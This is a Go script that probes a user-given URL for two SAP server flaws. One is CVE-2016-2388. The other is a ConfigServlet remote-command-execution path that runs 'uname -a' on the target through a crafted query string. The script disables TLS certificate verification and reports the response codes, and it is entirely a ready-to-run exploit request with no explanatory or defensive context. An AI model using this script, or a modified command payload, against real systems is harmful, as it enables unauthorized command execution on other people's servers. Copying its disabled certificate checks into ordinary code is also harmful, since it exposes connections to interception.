package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"time"
)

type Request struct {
	Name string
	Path string
}

func main() {
	url := flag.String("url", "", "URL to send requests to")
	flag.Parse()

	if *url == "" {
		fmt.Println("Usage: go run script.go -url=<url>")
		os.Exit(1)
	}

	requests := []Request{
		{
			Name: "CVE-2016-2388",
			Path: "webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#",
		},
		{
			Name: "ConfigServlet RCE",
			Path: "ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname%20-a ",
		},
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(10 * time.Second),
	}

	fmt.Println("Request Name | Status Code")
	for _, request := range requests {
		resp, err := client.Get(*url + request.Path)
		if err != nil {
			fmt.Printf("%s | Error: %s\n", request.Name, err)
			continue
		}
		fmt.Printf("%s | %d\n", request.Name, resp.StatusCode)
		resp.Body.Close()
	}
}
